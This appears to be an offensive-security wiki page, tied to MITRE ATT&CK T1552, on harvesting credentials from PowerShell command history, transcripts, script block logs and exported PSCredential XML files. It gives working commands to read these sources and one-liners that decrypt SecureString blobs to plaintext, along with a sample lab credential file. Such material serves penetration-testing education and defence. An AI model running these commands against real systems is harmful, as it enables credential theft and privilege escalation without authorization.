---
description: MITRE ATT&CK™  Unsecured Credentials - Technique T1552
---

# PowerShell Credentials

## Theory

In enterprise environments, we will often find PowerShell logging mechanisms enabled as Powershell tends to be an attractive attack surface. Although these are defensive measures, we may take advantage of them.

The **PowerShell command history**, **PowerShell transcription,** **PowerShell script block Logging** or **XML PSCredential files** may contain valuable information such as credentials, configuration settings, sensitive information that may be used as a means of privilege escalation.

* **PowerShell Transcript**: creates a unique record of every PowerShell session, including all input and output, exactly as it appears in the session. The information is stored in transcript files, which are by default written to the user’s documents folders, but can be configured to any accessible location on the local system or on the network.
* **PowerShell Script Block Logging**: captures commands and script blocks as events during execution, significantly expanding the scope of logged information by recording the complete content of executed code and commands. Consequently, each recorded event includes the original representation of encoded code or commands.
* **PowerShell Command History**: enabled by default, from PowerShell v5 on Windows 10, it saves the history of user's PowerShell sessions in a file. This file does not record non-terminal PowerShell sessions (such as WinRM or reverse shells).
* **PowerShell PSCredentials and SecureString:**  When interacting with credentials in PowerShell scripts, administrators often use `PSCredential` objects and `SecureString` to store sensitive data like usernames and passwords in a more secure format. However, in practice, these protections can be bypassed.

## Practice

### PowerShell Command History

{% tabs %}
{% tab title="Command History" %}
You should always first check the Command History File before checking other registration mechanisms. It contains user's commands logged by the [PSReadline](https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.3) module

```powershell
# Check for ConsoleHost_history.txt location
(Get-PSReadlineOption).HistorySavePath

# Print ConsoleHost_history.txt (default location)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

We may also check the `Get-History` cmdlet, but its contents may be deleted by administrators using `Clear-History`. Note that `Clear-History` does not clear the command history recorded by PSReadline.

```powershell
Get-History
```
{% endtab %}
{% endtabs %}

### **PowerShell Transcription**

{% tabs %}
{% tab title="Transcription" %}
PowerShell transcripts are automatically named to prevent collisions, with names beginning with `PowerShell_transcript`. By default, transcripts are written to the user’s documents folder.

Thus, we can simply check files in user's folder or search for specific filenames on the target computer.

```powershell
# Search for transcription in Documents folder
dir $env:userprofile\Documents
dir C:\Users\<USERNAME>\Documents

# Search transcription by filename
Get-ChildItem -Path C:\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
dir /s /b C:\*transcript*
```
{% endtab %}
{% endtabs %}

### **PowerShell Script Block Logging**

{% tabs %}
{% tab title="Script Block Logging" %}
Script block logging events are recorded using Windows EventID 4104. We may use following command to see them

```powershell
# Basic check
## print all events
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104|fl
## print first event
(Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104)[0]|fl

# Print events while a private key is required (you must have this key)
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104|Unprotect-CmsMessage|fl
```
{% endtab %}
{% endtabs %}

### **PowerShell PSCredentials and SecureString**

{% tabs %}
{% tab title="Decrypting XML PSCredentials" %}
Although a `SecureString` is designed to protect secrets in memory, it can be trivially decrypted by any process running under the **same user context** that originally created it. This is because Windows leverages **DPAPI (Data Protection API)** to encrypt `SecureString` content, tying the encryption keys to the current user's profile. If an attacker gains access to a process or session under that user context, they inherently gain the ability to decrypt any associated `SecureString` data.

For example, if a script stores a `PSCredential` object in an XML file using `Export-Clixml`, the resulting file may look like this:

{% code title="secret.xml" %}
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```
{% endcode %}

The `<SS N="Password">` field contains a DPAPI-encrypted `SecureString` blob. As long as the attacker is operating under the same user context (e.g., via reverse shell, token impersonation, or interactive login), they can fully recover the plaintext password.

```powershell
# Decrypt using SecureStringToBSTR
[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR( (ConvertTo-SecureString "<BLOB TO DECRYPT>")))

# Or decypt using System.Management.Automation.PSCredential
$Credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "<BLOB TO DECRYPT>"))
$password = echo $Credential.GetNetworkCredential().password
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.mandiant.com/resources/blog/greater-visibility" %}

{% embed url="https://attack.mitre.org/techniques/T1552/" %}
